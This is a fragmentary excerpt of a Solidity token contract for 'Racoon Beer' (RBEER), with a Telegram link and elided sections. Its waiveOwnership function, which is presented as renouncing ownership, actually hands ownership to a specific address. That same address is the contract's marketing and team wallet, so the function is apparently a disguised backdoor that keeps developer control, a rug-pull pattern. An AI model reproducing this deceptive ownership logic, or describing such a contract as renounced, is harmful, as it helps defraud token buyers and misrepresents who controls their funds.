...
/**
Telegram : https://t.me/RacoonBeer
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x0Ed19cCA8751af241fB7115286AeEBc248Aa77dB);
    }
...
contract RacoonBeer is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Racoon Beer";
    string private _symbol = "RBEER";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0Ed19cCA8751af241fB7115286AeEBc248Aa77dB);
    address payable private teamWalletAddress = payable(0x0Ed19cCA8751af241fB7115286AeEBc248Aa77dB);
